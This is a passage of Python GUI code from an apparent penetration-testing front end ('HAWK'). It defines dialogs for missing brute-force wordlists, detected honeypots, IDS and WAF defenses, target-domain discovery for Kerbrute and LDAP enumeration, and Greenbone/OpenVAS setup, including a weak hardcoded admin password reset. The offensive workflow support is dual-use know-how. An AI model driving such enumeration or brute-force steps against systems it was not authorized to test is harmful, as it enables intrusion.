        _title(win, "Missing Wordlist File")
        _note_box(win, f"Not found:\n{missing_path}", COLORS["text_red"])
        fb_u = find_wordlist(WORDLIST_PATHS_USERS)
        fb_p = find_wordlist(WORDLIST_PATHS_PASS)
        if fb_u or fb_p:
            _note_box(win,
                      f"✓ Fallback:\n  Users: {fb_u or 'not found'}\n  Passwords: {fb_p or 'not found'}",
                      COLORS["text_green"])
        else:
            _note_box(win,
                      "Install:\n  sudo apt install seclists wordlists\n"
                      "  sudo gunzip /usr/share/wordlists/rockyou.txt.gz",
                      COLORS["border_dim"])
        row = _btn_row(win)
        if callback_retry:
            _btn(row, "RETRY", lambda: [_safe_destroy(win), callback_retry()], primary=True, w=120)
        _btn(row, "CLOSE", lambda: _safe_destroy(win))


class DefenseAlertDialog:
    TYPE_ICONS = {
        "honeypot": ("⚠  POSSIBLE HONEYPOT",                    COLORS["text_red"]),
        "ids":      ("⚠  IDS / IPS DETECTED",                   COLORS["text_yellow"]),
        "firewall": ("⚠  NETWORK FIREWALL (packet filter, L3/L4)", COLORS["text_yellow"]),
        "waf":      ("⚠  WEB APPLICATION FIREWALL (layer 7)",   COLORS["text_yellow"]),
        "dmz":      ("⚠  DMZ PLACEMENT",                        COLORS["text_orange"]),
        "unknown":  ("⚠  ANOMALY",                              COLORS["text_dim"]),
    }

    def __init__(self, parent, alerts: list,
                 callback_continue=None, callback_abort=None):
        h = min(560, 200+len(alerts)*140)
        win = _make_win(parent, "Defense Alert", 580, h)
        for alert in alerts[:3]:
            icon, color = self.TYPE_ICONS.get(alert.alert_type, self.TYPE_ICONS["unknown"])
            ctk.CTkLabel(win, text=icon, font=_f("lg",True), text_color=color).pack(pady=(10,2))
            _sub(win, alert.description, color)
            conf_color = COLORS["text_red"] if alert.confidence>=70 else COLORS["text_yellow"]
            _sub(win, f"Confidence: {alert.confidence}%", conf_color)
            if alert.recommendation:
                box = ctk.CTkTextbox(win, height=80,
                                     fg_color=COLORS["bg_card"], text_color=COLORS["text_dim"],
                                     border_color=COLORS["border_dim"], border_width=1,
                                     font=_f("md"), corner_radius=3)
                box.pack(fill="x", padx=24, pady=4)
                box.insert("1.0", alert.recommendation); box.configure(state="disabled")
            _divider(win)
        _recommended(win, "Continue with caution")
        row = _btn_row(win)
        _btn(row, "CONTINUE WITH CAUTION",
             lambda: [_safe_destroy(win), callback_continue and callback_continue()],
             primary=True, w=200)
        _btn(row, "ABORT",
             lambda: [_safe_destroy(win), callback_abort and callback_abort()], danger=True)


class DomainSuggestionDialog:
    """Shown when a tool parser extracts a plausible domain name from its
    output.  Lets the user accept, edit, or dismiss the suggestion.

    Kept here rather than in-lined so any parser can reuse it — the
    discovery workflow must be identical regardless of which tool found
    the domain.
    """

    def __init__(self, parent, domain: str, source: str,
                 confidence: int, evidence: str,
                 on_accept=None, on_dismiss=None):
        win = _make_win(parent, "Target Domain Detected", 580, 460)

        _title(win, "ⓘ  Target Domain Detected")
        _sub(win, f"A tool just found what looks like the target's DNS "
                  f"domain. Accept to save it to the session / Target "
                  f"Intel, or dismiss to ignore.", COLORS["text_dim"])

        # ── Editable domain + source + confidence bar ────────────────
        info = ctk.CTkFrame(win, fg_color="transparent")
        info.pack(fill="x", padx=24, pady=(10, 4))
        info.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(info, text="Domain:", font=_f("md", True),
                     text_color=COLORS["text_dim"],
                     width=100, anchor="w").grid(
            row=0, column=0, sticky="w", pady=3)
        domain_var = ctk.StringVar(value=domain)
        domain_entry = ctk.CTkEntry(
            info, textvariable=domain_var, font=_f("md"), height=30,
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_green"],
            border_color=COLORS["border_green"],
            border_width=1, corner_radius=3)
        domain_entry.grid(row=0, column=1, sticky="ew", padx=8, pady=3)

        ctk.CTkLabel(info, text="Source:", font=_f("md", True),
                     text_color=COLORS["text_dim"],
                     width=100, anchor="w").grid(
            row=1, column=0, sticky="w", pady=3)
        ctk.CTkLabel(info, text=source, font=_f("md"),
                     text_color=COLORS["text_cyan"],
                     anchor="w").grid(
            row=1, column=1, sticky="w", padx=8, pady=3)

        ctk.CTkLabel(info, text="Confidence:", font=_f("md", True),
                     text_color=COLORS["text_dim"],
                     width=100, anchor="w").grid(
            row=2, column=0, sticky="w", pady=3)
        filled = max(0, min(20, int(confidence) // 5))
        bar = "█" * filled + "░" * (20 - filled)
        conf_color = (COLORS["text_green"] if confidence >= 80
                      else COLORS["text_yellow"] if confidence >= 50
                      else COLORS["text_red"])
        ctk.CTkLabel(info, text=f"{bar}  {confidence}%",
                     font=ctk.CTkFont(family="Courier New", size=12,
                                      weight="bold"),
                     text_color=conf_color, anchor="w").grid(
            row=2, column=1, sticky="w", padx=8, pady=3)

        # ── Evidence box ──────────────────────────────────────────────
        ctk.CTkLabel(win, text="Evidence from tool output:",
                     font=_f("md", True),
                     text_color=COLORS["text_muted"],
                     anchor="w").pack(fill="x", padx=24, pady=(10, 2))
        box = ctk.CTkTextbox(
            win, height=100, font=_f("sm"),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_dim"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3, wrap="word")
        box.pack(fill="x", padx=24, pady=(0, 8))
        box.insert("1.0", (evidence or "(no evidence captured)").strip())
        box.configure(state="disabled")

        _note_box(
            win,
            "ACCEPT  → saved to session.target_domain, added to Target "
            "Intel, pre-populated in Kerbrute / LDAP / enum dialogs.\n"
            "DISMISS → this (source, domain) pair will not prompt again.",
            COLORS["text_muted"])

        # ── Buttons ───────────────────────────────────────────────────
        def _accept():
            final = domain_var.get().strip().rstrip(".").lower()
            _safe_destroy(win)
            if on_accept and final:
                on_accept(final)

        def _dismiss():
            _safe_destroy(win)
            if on_dismiss:
                on_dismiss()

        r = _btn_row(win)
        _btn(r, "ACCEPT", _accept, primary=True, w=120)
        _btn(r, "DISMISS", _dismiss, w=120)


class GreenboneDialog:
    SCAN_CONFIGS = ["Full and fast","Full and fast ultimate",
                    "Full and very deep","System Discovery","Host Discovery"]

    def __init__(self, parent, tool, app, callback_run=None,
                 callback_skip=None, callback_setup_complete=None):
        self._tool=tool; self._app=app; self._parent=parent
        self._callback_run=callback_run; self._callback_skip=callback_skip
        # Invoked when the user goes through START / AUTOFIX (web-UI
        # mode) instead of the GMP scan path.  Lets the card route
        # flip the tool's dot to "done" + register an execution entry
        # — otherwise the card stays grey forever, because the GMP
        # path's done_callback never fires.
        self._callback_setup_complete = callback_setup_complete
        from utils.runner import GreenBoneRunner, greenbone_web_up
        installed = GreenBoneRunner.is_available()
        if not installed:
            self._show_install_dialog(parent)
            return
        # The "already ready → open the dashboard" branch must hinge on
        # the WEB UI (gsad on :9392), NOT the Manager (gvmd).  is_running()
        # only probes gvmd via gvm-cli, so on a gvmd-up / gsad-down box it
        # reported "running" and RUN opened the Access Panel + a browser on
        # a dead :9392.  greenbone_web_up() probes gsad directly: a
        # gvmd-up / gsad-down box now falls through to the START flow (which
        # brings gsad up) instead of flinging a browser at a dead port.
        # The socket probe runs in a worker + "Checking…" modal so it
        # can't block the UI thread.
        self._show_checking_modal(
            parent, "Checking Greenbone web UI status…",
            lambda: greenbone_web_up(),
            lambda web_up: (self._open_web_and_panel(parent) if web_up
                            else self._show_start_dialog(parent)))

    def _open_web_and_panel(self, parent):
        """GVM is up.  The operator drives scans from the Greenbone web
        UI, so RUN just opens the dashboard and shows the access panel
        (URL + login helpers) — HAWK does NOT launch a GMP scan.  This
        avoids the whole create_target/create_task/poll/parse path (and
        its GMP-version fragility); the web UI is the real interface."""
        import webbrowser
        url = "https://127.0.0.1:9392"
        app = getattr(self, "_app", None) or getattr(parent, "app", None)
        try:
            webbrowser.open(url)
        except Exception:
            pass
        try:
            if app and hasattr(app, "terminal"):
                app.terminal.write(
                    f"  [*] Greenbone is running — opening {url}.  Drive "
                    f"your scans from the web UI.", "info")
        except Exception:
            pass
        if self._callback_setup_complete:
            try:
                self._callback_setup_complete(self._tool)
            except Exception as e:
                print(f"[HAWK] greenbone setup_complete cb failed: {e}")
        self._show_access_panel(parent)

    # ─── Threaded "Checking…" modal ───────────────────────────────────────
    def _show_checking_modal(self, parent, label, worker, on_done):
        """Show a tiny modal while `worker()` runs in a thread; then call
        `on_done(result)` on the UI thread. Keeps the app responsive during
        blocking gvm-cli / gvm-check-setup subprocess calls."""
        import threading
        m = _make_win(parent, "Greenbone", 380, 120)
        ctk.CTkLabel(m, text=label, font=_f("md"),
                     text_color=COLORS["text_bright"]).pack(pady=(20, 8))
        ctk.CTkLabel(m, text="(this can take a few seconds)",
                     font=_f("sm"), text_color=COLORS["text_dim"]).pack()
        try:
            pb = ctk.CTkProgressBar(m, mode="indeterminate", width=260)
            pb.pack(pady=10); pb.start()
        except Exception:
            pb = None

        result = {"value": None, "error": None}

        def _run():
            try:
                result["value"] = worker()
            except Exception as e:
                result["error"] = e

        def _check_done():
            if t.is_alive():
                m.after(100, _check_done); return
            try:
                if pb: pb.stop()
            except Exception:
                pass
            _safe_destroy(m)
            if result["error"] is None:
                on_done(result["value"])

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        m.after(100, _check_done)

    def _show_scan_dialog(self, parent):
        self._cfg_var = ctk.StringVar(value=self.SCAN_CONFIGS[0])
        win = _make_win(parent, "Greenbone Scan", 540, 400)
        _title(win, "GREENBONE / OpenVAS  —  Scan")
        for cfg in self.SCAN_CONFIGS:
            rf = ctk.CTkFrame(win, fg_color="transparent")
            rf.pack(anchor="w", padx=50, pady=4)
            rb = ctk.CTkRadioButton(rf, text=cfg, variable=self._cfg_var, value=cfg,
                                    font=_f("md"), text_color=COLORS["text_dim"],
                                    fg_color=COLORS["border_green"],
                                    border_color=COLORS["border_dim"])
            rb.pack(side="left")
            if cfg == "Full and fast":
                ctk.CTkLabel(rf, text="  ★ recommended", font=_f("sm"),
                             text_color=COLORS["text_green"]).pack(side="left")
        _note_box(win, "⚠  Very noisy. 10-30 minutes. Authorized targets only.",
                  COLORS["text_yellow"])
        _note_box(win,
                  "Password reset if needed:\n"
                  "  sudo runuser -u _gvm -- gvmd --user=admin --new-password=admin123",
                  COLORS["border_dim"])
        self._win_scan = win
        row = _btn_row(win)
        _btn(row, "START SCAN", self._confirm_scan, primary=True)
        _btn(row, "SKIP",
             lambda: [_safe_destroy(win), self._callback_skip and self._callback_skip()])
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _confirm_scan(self):
        cfg = self._cfg_var.get()
        _safe_destroy(self._win_scan)
        if self._callback_run: self._callback_run(self._tool, cfg)

    def _show_start_dialog(self, parent):
        """Check setup first, then start. gvm-check-setup runs in a thread
        (up to 30s) so it cannot freeze the UI."""
        import subprocess

        def _check():
            errors = []
            try:
                r = subprocess.run(["sudo", "gvm-check-setup"],
                                   capture_output=True, text=True, timeout=30)
                for line in r.stdout.splitlines():
                    if "ERROR:" in line:
                        errors.append(line.replace("ERROR:", "").strip())
            except Exception:
                pass
            return errors

        def _after_check(errors):
            # SCAP / CERT feed data drive CVE and advisory MATCHING, not
            # the NVT-based scan itself — a "Full and fast" scan runs fine
            # without them.  Treat those (and the rollup "installation not
            # yet complete" summary) as non-blocking, so a throttled
            # community feed sync doesn't prevent scanning; scanner /
            # gvmd / cert-infrastructure / redis errors still hard-block.
            def _soft(e):
                low = e.lower()
                return ("scap" in low or "cert-bund" in low
                        or "cert data" in low or "not yet complete" in low)
            blockers = [e for e in errors if not _soft(e)]
            soft = [e for e in errors if _soft(e)]
            if blockers:
                self._show_check_and_fix_dialog(parent, errors)
                return
            self._show_ready_to_start(parent, soft)

        self._show_checking_modal(
            parent, "Running gvm-check-setup…", _check, _after_check)

    def _show_ready_to_start(self, parent, warnings=None):
        win = _make_win(parent, "Greenbone — Start", 600, 460)
        _title(win, "Greenbone installed but not running")
        if warnings:
            _note_box(win,
                      "Scanner ready.  Non-blocking feed data missing — the "
                      "NVT scan runs, but CVE/advisory matching is disabled "
                      "until you sync it:\n" +
                      "\n".join(f"  • {w}" for w in warnings[:4]) +
                      "\n  Later:  sudo greenbone-feed-sync --type scap",
                      COLORS["text_yellow"])
        else:
            _note_box(win, "All checks passed. Ready to start GVM services.",
                      COLORS["text_green"])
        _note_box(win,
                  "After START:\n"
                  "  • Wait up to ~3 min for services to finish coming up.\n"
                  "  • A browser window should open on https://127.0.0.1:9392\n"
                  "  • If it doesn't: open Firefox/Chrome on Kali and paste\n"
                  "    the URL manually (see Access Panel after START).\n"
                  "  • Default user: admin  (password was shown by gvm-setup)",
                  COLORS["border_dim"])
        _note_box(win,
                  "Forgot the admin password? One-shot reset in terminal:\n"
                  "  sudo runuser -u _gvm -- gvmd \\\n"
                  "      --user=admin --new-password=admin123",
                  COLORS["text_yellow"])
        _recommended(win, "START opens an xterm so you can see progress")

        def _start_and_open():
            _safe_destroy(win)
            # Idempotent pre-flight: if gsad is already listening on :9392,
            # do NOT relaunch gvm-start (that is what produced the double
            # start + transient bind-failed noise) — go straight to opening
            # the browser.  open_greenbone_when_ready below sees the port up
            # and opens immediately.
            _app0 = getattr(self, "_app", None) or getattr(parent, "app", None)
            try:
                from utils.runner import greenbone_web_up
                _already_up = greenbone_web_up()
            except Exception:
                _already_up = False
            if _already_up:
                try:
                    if _app0 and hasattr(_app0, "terminal"):
                        _app0.terminal.write(
                            "  [*] Greenbone already up on :9392 — opening "
                            "browser directly (skipping gvm-start).", "info")
                except Exception:
                    pass
            else:
                self._start_xterm()
            # Open the browser only once gvmd's web UI actually answers
            # over HTTPS — fixed-delay timers (8s, 15s) raced gvm-start:
            # the page loaded while ospd-openvas was still reloading NVTs
            # and the user had to F5.  Helper polls the port and only
            # then opens the browser; falls back after a hard timeout.
            app = getattr(self, "_app", None) or \
                  getattr(parent, "app", None)
            def _say(msg):
                try:
                    if app and hasattr(app, "terminal"):
                        app.terminal.write(f"  [*] {msg}", "info")
                except Exception:
                    pass
            try:
                from utils.runner import open_greenbone_when_ready
                open_greenbone_when_ready(on_status=_say)
            except Exception:
                pass
            # Instead of auto-opening the access panel: print a hint
            # to the HAWK terminal so the user knows where to click
            # if they need it.
            try:
                if app and hasattr(app, "terminal"):
                    app.terminal.write(
                        "  [*] Greenbone starting in xterm.  "
                        "Click the ACCESS PANEL button (next to RUN) "
                        "when you need the URL / login helpers.",
                        "info")
            except Exception:
                pass
            # Card-status callback — flips the dot to "done" so the
            # user can see the tool counts as run.  The web-UI mode
            # bypasses GMP, which is what historically left the dot
            # grey forever.
            if self._callback_setup_complete:
                try:
                    self._callback_setup_complete(self._tool)
                except Exception as _e:
                    print(f"[HAWK] greenbone setup_complete cb "
                          f"failed: {_e}")

        row = _btn_row(win)
        _btn(row, "START (xterm + browser)",
             _start_and_open, primary=True, w=220)
        _btn(row, "SKIP",
             lambda: [_safe_destroy(win), self._callback_skip and self._callback_skip()])

    # ─── Access Panel — URL + login helpers ─────────────────────────────────
    def _show_access_panel(self, parent):
        """Shown after START (or after autofix completes). Gives the user a
        one-stop place to grab the URL, copy it to the clipboard, reopen
        the browser manually, and run password helpers when the default
        login is unknown/forgotten."""
        from utils.clipboard import clipboard_copy
        from utils.runner import _open_terminal

        URL = "https://127.0.0.1:9392"
        win = _make_win(parent, "Greenbone — Access Panel", 640, 560)
        _title(win, "GREENBONE  —  Access Panel")
        _sub(win, "Services are starting. Use this panel to log in.")

        # URL row — big, copyable, openable
        url_frame = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                                 corner_radius=3,
                                 border_color=COLORS["border_green"],
                                 border_width=1)
        url_frame.pack(fill="x", padx=24, pady=(8, 4))
        ctk.CTkLabel(url_frame, text="Web UI", font=_f("sm", True),
                     text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=10, pady=(6, 0))
        url_row = ctk.CTkFrame(url_frame, fg_color="transparent")
        url_row.pack(fill="x", padx=10, pady=(2, 8))
        ctk.CTkLabel(url_row, text=URL, font=_f("lg", True),
                     text_color=COLORS["text_cyan"],
                     anchor="w").pack(side="left", fill="x", expand=True)

        def _copy_url():
            clipboard_copy(URL)
            self._app.terminal.write(
                f"  [*] Copied {URL} to clipboard — paste into Firefox/Chrome.",
                "info")

        def _open_browser():
            # Don't fling a browser at a dead port: gvmd can be up while
            # gsad (the web UI on :9392) is still down / coming up.  Probe
            # gsad first — the same guard the readiness poller uses — and
            # give an actionable message instead of opening a broken page.
            from utils.runner import greenbone_web_up
            if not greenbone_web_up():
                self._app.terminal.write(
                    "  [!] Greenbone web UI is not answering on :9392 yet — "
                    "not opening a dead page.  Make sure gsad is up "
                    "(sudo gvm-start), then check  ss -tlnp | grep 9392.",
                    "warn")
                return
            import webbrowser
            try:
                webbrowser.open(URL)
            except Exception:
                pass
            self._app.terminal.write(
                f"  [*] Opening {URL} — if nothing happens, click COPY URL "
                f"and paste it into your browser.", "info")

        ctk.CTkButton(url_row, text="COPY URL", width=90, height=26,
                      font=_f("sm", True),
                      fg_color=COLORS["bg_secondary"],
                      hover_color=COLORS["bg_card_hover"],
                      text_color=COLORS["text_bright"],
                      border_color=COLORS["border_dim"], border_width=1,
                      command=_copy_url).pack(side="left", padx=(6, 2))
        ctk.CTkButton(url_row, text="OPEN BROWSER", width=130, height=26,
                      font=_f("sm", True),
                      fg_color=COLORS["bg_secondary"],
                      hover_color=COLORS["bg_card_hover"],
                      text_color=COLORS["text_green"],
                      border_color=COLORS["border_green"], border_width=1,
                      command=_open_browser).pack(side="left", padx=(2, 6))

        _note_box(win,
                  "If the browser doesn't open automatically:\n"
                  "  1. Click COPY URL above.\n"
                  "  2. Open Firefox or Chrome on Kali.\n"
                  "  3. Paste into the address bar and press Enter.\n"
                  "  4. Accept the self-signed TLS warning (Advanced → Proceed).",
                  COLORS["border_dim"])

        # Password / login helpers
        ctk.CTkLabel(win, text="Login helpers",
                     font=_f("md", True), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=24, pady=(8, 2))

        LIST_USERS_CMD = "sudo runuser -u _gvm -- gvmd --get-users"
        RESET_PASS_CMD = ("sudo runuser -u _gvm -- gvmd "
                          "--user=admin --new-password=admin123")
        GREP_SETUP_CMD = ("sudo grep -iE 'user created|password' "
                          "/var/log/gvm/*.log 2>/dev/null | tail -20")

        def _cmd_row(label, cmd, hint):
            fr = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              corner_radius=3,
                              border_color=COLORS["border_dim"],
                              border_width=1)
            fr.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(fr, text=label, font=_f("sm", True),
                         text_color=COLORS["text_bright"],
                         anchor="w").pack(fill="x", padx=8, pady=(5, 0))
            ctk.CTkLabel(fr, text=hint, font=_f("xs"),
                         text_color=COLORS["text_dim"], anchor="w",
                         justify="left").pack(fill="x", padx=8)
            row = ctk.CTkFrame(fr, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=(2, 6))
            ctk.CTkLabel(row, text=f"$ {cmd}", font=_f("sm"),
                         text_color=COLORS["text_cyan"], anchor="w"
                         ).pack(side="left", fill="x", expand=True)
            ctk.CTkButton(row, text="COPY", width=60, height=22,
                          font=_f("xs", True),
                          fg_color=COLORS["bg_secondary"],
                          hover_color=COLORS["bg_card_hover"],
                          text_color=COLORS["text_bright"],
                          border_color=COLORS["border_dim"], border_width=1,
                          command=lambda c=cmd: (
                              clipboard_copy(c),
                              self._app.terminal.write(
                                  f"  [*] Copied: {c}", "info"))
                          ).pack(side="left", padx=2)
            ctk.CTkButton(row, text="RUN", width=60, height=22,
                          font=_f("xs", True),
                          fg_color=COLORS["bg_secondary"],
                          hover_color=COLORS["bg_card_hover"],
                          text_color=COLORS["text_green"],
                          border_color=COLORS["border_green"], border_width=1,
                          command=lambda c=cmd, l=label: _open_terminal(
                              f"HAWK — {l}",
                              f"echo '=== {l} ==='; {c}; "
                              f"echo ''; read -p 'Press ENTER to close...'")
                          ).pack(side="left", padx=2)

        _cmd_row("List GVM users",
                 LIST_USERS_CMD,
                 "Shows every user registered in gvmd — confirms 'admin' exists.")
        _cmd_row("Reset admin password to 'admin123'",
                 RESET_PASS_CMD,
                 "Use if you forgot the password gvm-setup printed.")
        _cmd_row("Search gvm logs for setup password",
                 GREP_SETUP_CMD,
                 "Sometimes gvm-setup logs the one-time admin password.")

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    def _start_xterm(self):
        # START (already installed, gvm-check-setup passed) must ONLY
        # bring services up — NOT re-run the installer, which re-runs
        # gvm-setup and re-downloads the multi-GB feeds (10-20 min) and
        # made the browser open before the service was ready.
        from utils.runner import GreenBoneInstaller
        GreenBoneInstaller().start_in_xterm()

    def _show_install_dialog(self, parent):
        win = _make_win(parent, "Greenbone — Install", 580, 440)
        _title(win, "Greenbone / OpenVAS  —  Not Installed")
        _note_box(win,
                  "Installation opens in xterm (enter sudo password there).\n\n"
                  "Steps:\n"
                  "  1. sudo apt install -y gvm\n"
                  "  2. sudo gvm-setup  (10-20 minutes)\n"
                  "  3. sudo gvm-start\n"
                  "  4. Open browser: http://127.0.0.1:9392\n\n"
                  "The admin password will appear in the xterm output.",
                  COLORS["border_dim"])
        _note_box(win,
                  "Password reset if needed:\n"
                  "  sudo runuser -u _gvm -- gvmd --user=admin --new-password=admin123",
                  COLORS["text_yellow"])
        _recommended(win, "Install via xterm")
        row = _btn_row(win)
        _btn(row, "INSTALL (xterm)",
             lambda: [_safe_destroy(win), self._install_xterm(parent)],
             primary=True, w=160)
        _btn(row, "SKIP",
             lambda: [_safe_destroy(win), self._callback_skip and self._callback_skip()], w=100)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _show_check_and_fix_dialog(self, parent, errors: list):
        """Show Greenbone check errors with auto-fix option."""
        win = _make_win(parent, "Greenbone — Fix Required", 600, 420)
        _title(win, "Greenbone Setup Incomplete")
        _note_box(win,
                  "gvm-check-setup found issues:\n\n" +
                  "\n".join(f"  ✗ {e}" for e in errors[:5]),
                  COLORS["text_red"])

        fix_cmds = []
        for err in errors:
            if "SCAP" in err:
                fix_cmds.append("sudo greenbone-feed-sync --type scap")
            elif "CERT" in err:
                fix_cmds.append("sudo greenbone-feed-sync --type cert")
            elif "gvmd-data" in err.lower():
                fix_cmds.append("sudo greenbone-feed-sync --type gvmd-data")
            elif "notus" in err.lower():
                fix_cmds.append("sudo greenbone-feed-sync --type notus-data")

        if fix_cmds:
            _note_box(win,
                      "Fix commands:\n" + "\n".join(f"  {c}" for c in fix_cmds),
                      COLORS["text_yellow"])

        def _autofix():
            _safe_destroy(win)
            from utils.runner import _open_terminal
            script = "; ".join(
                [f"echo '=== Running: {c} ==='; {c}" for c in fix_cmds] +
                ["echo '=== Done ==='; sudo gvm-start",
                 "read -p 'Press ENTER to close...'"]
            )
            _open_terminal("HAWK — Greenbone Fix", script)
            # Open the browser only once gvmd's web UI actually answers
            # over HTTPS.  See _start_and_open for the rationale — the
            # autofix path was particularly bad because feed-sync +
            # gvm-start + NVT reload can take well over 60s, and the
            # old 15s timer always opened the page mid-load.
            app = getattr(self, "_app", None) or \
                  getattr(parent, "app", None)
            def _say(msg):
                try:
                    if app and hasattr(app, "terminal"):
                        app.terminal.write(f"  [*] {msg}", "info")
                except Exception:
                    pass
            try:
                from utils.runner import open_greenbone_when_ready
                open_greenbone_when_ready(on_status=_say)
            except Exception:
                pass
            # Terminal breadcrumb — tells the user where the helper
            # panel lives so they don't have to guess.
            try:
                app = getattr(self, "_app", None) or \
                      getattr(parent, "app", None)
                if app and hasattr(app, "terminal"):
                    app.terminal.write(
                        "  [*] Greenbone fix running in xterm.  "
                        "Click the ACCESS PANEL button (next to RUN) "
                        "when you need the URL / login helpers.",
                        "info")
            except Exception:
                pass
            # Card-status callback — same rationale as _start_and_open.
            # The autofix path equally counts as "tool ran in web-UI
            # mode", so the dot should flip to done.
            if self._callback_setup_complete:
                try:
                    self._callback_setup_complete(self._tool)
                except Exception as _e:
                    print(f"[HAWK] greenbone setup_complete cb "
                          f"failed: {_e}")

        row = _btn_row(win)
        if fix_cmds:
            _btn(row, "FIX AUTOMATICALLY", _autofix, primary=True, w=180)
        _btn(row, "SKIP", lambda: [_safe_destroy(win),
             self._callback_skip and self._callback_skip()], w=100)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))

    def _install_xterm(self, parent):
        from utils.runner import GreenBoneInstaller
        ok = GreenBoneInstaller().install_in_xterm()
        if ok:
            # Show 10-second countdown popup
            GreenboneCountdownDialog(parent)
        else:
            self._app.terminal.write(
                "[!] No terminal emulator.\n"
                "    Install: sudo apt install xterm", "error")


__all__ = ['GreenboneCountdownDialog', 'NonStandardPortDialog', 'LhostDialog', 'ExploitSelectorDialog', 'OsAmbiguousDialog', 'AccessGateDialog', 'PermissionDialog', 'NmapCustomDialog', 'RustscanCustomDialog', 'ApiKeyManagerDialog', 'MetasploitDialog', 'BruteForceDialog', 'WAFEvasionDialog', 'WordlistCheckDialog', 'DefenseAlertDialog', 'DomainSuggestionDialog', 'GreenboneDialog']
